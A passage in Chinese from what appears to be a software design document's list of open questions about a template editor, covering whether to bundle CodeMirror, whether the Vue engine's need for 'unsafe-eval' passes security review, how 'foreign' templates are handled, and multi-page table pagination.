2. **是否引入 CodeMirror**（+90KB，懒加载）？不引入的话代码模式体验会很差，建议引入。
3. **`unsafe-eval` 是否可接受**？这是 Vue 引擎的门槛问题，需要安全评审拍板（缓解措施见 §8.3）。
4. **`foreign` 模板的 Vue 支持**：本期直接禁用，还是做「首次渲染需用户确认」的交互？建议本期禁用。
5. **多页分页**：`page.paged` 只提供 `break-inside: avoid` 类的 CSS 辅助，真正的「第 2 页重复表头」需要更复杂的度量。本期只做 CSS 辅助，度量方案另议。
